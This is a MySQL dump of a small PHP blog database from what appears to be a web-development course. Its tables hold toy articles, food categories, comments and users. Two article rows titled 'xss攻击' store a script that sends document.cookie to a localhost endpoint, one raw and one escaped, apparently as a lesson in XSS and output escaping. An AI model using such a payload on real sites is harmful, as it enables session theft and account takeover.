-- phpMyAdmin SQL Dump
-- version 4.5.1
-- http://www.phpmyadmin.net
--
-- Host: 127.0.0.1
-- Generation Time: 2016-06-08 10:27:21
-- 服务器版本： 5.7.9
-- PHP Version: 5.6.15

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `icblog4`
--

-- --------------------------------------------------------

--
-- 表的结构 `article`
--

DROP TABLE IF EXISTS `article`;
CREATE TABLE IF NOT EXISTS `article` (
  `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT,
  `name` varchar(100) NOT NULL COMMENT '博客的标题 字符串 varchar(100) 不可为空 没有默认值',
  `content` text COMMENT '正文 大字符串 text',
  `category_id` int(11) DEFAULT NULL COMMENT '分类（指的是分类表里的一个id，有且仅有一个特殊值0，它表示没有选择分类） 数字 INT 不可为空 没有默认值',
  `status` tinyint(4) NOT NULL DEFAULT '2' COMMENT '状态 1.草稿，2.公开，3.隐藏',
  `publish_date` int(11) NOT NULL COMMENT '发布日期 时间戳 int 不可以为空 没有默认值',
  `is_top` tinyint(4) NOT NULL DEFAULT '2' COMMENT '灵活的写法：数字 tinyint 1: 置顶 2:不置顶',
  `user_id` int(10) UNSIGNED NOT NULL,
  `read` int(10) UNSIGNED NOT NULL DEFAULT '0',
  `good` int(10) UNSIGNED NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=518 DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `article`
--

INSERT INTO `article` (`id`, `name`, `content`, `category_id`, `status`, `publish_date`, `is_top`, `user_id`, `read`, `good`) VALUES
(1, 'PHP从入门到放弃的心理路程', '<p>学了php，脸不红，腰不酸，心也不跳了。</p>\r\n', 19, 2, 1462765785, 1, 1, 42, 2),
(2, 'aaaa', '<p>dddd<strong>dd&lt;script&gt;alert(1)&lt;/script&gt;</strong></p>\r\n', 0, 1, 1448008399, 2, 0, 0, 0),
(4, 'Javascript从入门到放弃', '<p>1. ...</p>\r\n\r\n<p>2.....</p>\r\n\r\n<p>3....</p>\r\n', 5, 3, 1462783632, 1, 0, 0, 0),
(5, '1', '1', 19, 2, 0, 2, 0, 0, 0),
(6, '1', '1', 19, 2, 0, 2, 0, 0, 0),
(7, '1', '1', 19, 2, 0, 2, 0, 0, 0),
(8, '1', '1', 19, 2, 0, 2, 0, 0, 0),
(9, '1', '1', 19, 2, 0, 2, 0, 0, 0),
(10, '1', '1', 19, 2, 0, 2, 0, 0, 0),
(512, 'xss攻击', '\r\nalert(window.document.cookie);\r\nvar img = new Image();\r\nimg.src="http://localhost/day5/web/index.php?c=Home&p=frontend&a=xss&co=" + window.document.cookie;\r\n', 0, 1, 1448008399, 2, 0, 0, 0),
(513, 'xss攻击-htmlspecialchars', '&lt;script&gt;\r\nalert(window.document.cookie);\r\nvar img = new Image();\r\nimg.src=&quot;http://localhost/day5/web/index.php?c=Home&amp;p=frontend&amp;a=xss&amp;co=&quot; + window.document.cookie;\r\n&lt;/script&gt;', 1, 1, 1448008399, 2, 1, 66, 7),
(514, 'chrome-张飞2写的', '&lt;p&gt;突然觉得这样才叫生活...&lt;/p&gt;\r\n', 0, 1, 1448008399, 2, 1, 0, 0),
(515, 'ie-刘禅写的', '&lt;p&gt;这里没有wifi...&lt;/p&gt;\r\n', 0, 1, 1448008399, 2, 2, 0, 0),
(516, 'aaaaa', '<p>突然觉得这才叫生活...</p>\r\n', 0, 1, 1448008399, 2, 1, 0, 0),
(517, 'php是最好的语言', '<p>今天没吃药，感觉萌萌哒</p>', 19, 2, 1464229784, 2, 1, 6, 1);

-- --------------------------------------------------------

--
-- 表的结构 `category`
--

DROP TABLE IF EXISTS `category`;
CREATE TABLE IF NOT EXISTS `category` (
  `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT,
  `name` varchar(20) NOT NULL,
  `alias` varchar(10) NOT NULL DEFAULT '',
  `sort` int(10) UNSIGNED NOT NULL DEFAULT '0',
  `parent_id` int(10) UNSIGNED NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=20 DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `category`
--

INSERT INTO `category` (`id`, `name`, `alias`, `sort`, `parent_id`) VALUES
(1, '科技1', '', 50, 0),
(2, '武侠', '', 50, 0),
(3, '旅游', '', 50, 0),
(4, '美食', '', 50, 0),
(5, 'IT1', '', 50, 1),
(6, '生物', '', 50, 0),
(7, '鸟类', '', 50, 6),
(8, '湘菜', '', 50, 4),
(9, '粤菜', '', 50, 4),
(10, '川菜', '', 50, 4),
(11, '跳跳蛙', '', 50, 8),
(12, '口味虾2', '', 50, 9),
(14, '白切鸡', '', 50, 9),
(15, '隆江猪脚', '', 50, 9),
(16, '麻婆豆腐', '', 50, 10),
(17, '回锅肉', '', 50, 10),
(18, '毛血旺', '', 50, 10),
(19, 'PHP', '世界上最好的语言', 50, 5);

-- --------------------------------------------------------

--
-- 表的结构 `icomment`
--

DROP TABLE IF EXISTS `icomment`;
CREATE TABLE IF NOT EXISTS `icomment` (
  `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `publish_time` int(11) NOT NULL,
  `content` varchar(200) NOT NULL,
  `reply_id` int(10) UNSIGNED NOT NULL DEFAULT '0',
  `article_id` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=31 DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `icomment`
--

INSERT INTO `icomment` (`id`, `user_id`, `publish_time`, `content`, `reply_id`, `article_id`) VALUES
(2, 1, 0, '萌萌哒2', 0, 1),
(3, 1, 0, '萌萌哒', 0, 1),
(4, 1, 0, '萌萌哒', 0, 1),
(5, 1, 0, '萌萌哒', 2, 1),
(6, 1, 0, '萌萌哒', 0, 1),
(7, 1, 0, '萌萌哒', 0, 1),
(8, 1, 0, '萌萌哒', 0, 1),
(9, 1, 0, '萌萌哒', 0, 1),
(10, 1, 0, '萌萌哒', 0, 1),
(11, 1, 0, '萌萌哒', 0, 1),
(12, 1, 0, '萌萌哒', 0, 1),
(13, 1, 0, '萌萌哒', 0, 1),
(14, 1, 0, '萌萌哒', 0, 1),
(15, 1, 0, '萌萌哒', 0, 1),
(16, 1, 0, '萌萌哒', 0, 1),
(17, 1, 0, '萌萌哒', 0, 1),
(18, 1, 1463297499, '萌萌哒', 0, 513),
(19, 1, 1463297499, '萌萌哒19', 0, 513),
(20, 1, 1463297499, '萌萌哒20', 0, 513),
(21, 1, 1463297499, '萌萌哒21', 18, 513),
(22, 1, 1463297499, '萌萌哒22', 18, 513),
(23, 1, 1463297499, '萌萌哒，今天天气很好。', 19, 513),
(24, 1, 1463300646, '23333333...', 19, 513),
(25, 2, 1463300718, '2244', 0, 513),
(26, 1, 1464229543, '一言不和就翻车', 0, 1),
(27, 1, 1464229561, '1', 0, 1),
(28, 1, 1464229947, 'aaa', 0, 517),
(29, 1, 1465262512, '我唯一的优点就是没有缺点。', 0, 1),
(30, 1, 1465262618, '&quot;这件事的和我对象商量&quot;\r\n&quot;你不是没有对象吗？&quot;\r\n&quot;所以没得商量！&quot;', 29, 1);

-- --------------------------------------------------------

--
-- 表的结构 `user`
--

DROP TABLE IF EXISTS `user`;
CREATE TABLE IF NOT EXISTS `user` (
  `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT,
  `username` varchar(16) NOT NULL,
  `password` varchar(64) NOT NULL,
  `nickname` varchar(16) NOT NULL DEFAULT '',
  `email` varchar(64) NOT NULL DEFAULT '',
  `last_login_time` int(10) UNSIGNED NOT NULL DEFAULT '0',
  `last_login_ip` varchar(15) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `user`
--

INSERT INTO `user` (`id`, `username`, `password`, `nickname`, `email`, `last_login_time`, `last_login_ip`) VALUES
(1, '张飞2', '948b5904da610204ec4edff8a069bf3b', '翼德', '666@qq.com', 1462503674, ''),
(2, '刘禅', '948b5904da610204ec4edff8a069bf3b', '阿斗', 'dou@qq.com', 1462503674, ''),
(4, '关羽2', '948b5904da610204ec4edff8a069bf3b', '云长', 'yc@qq.com', 0, '');

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
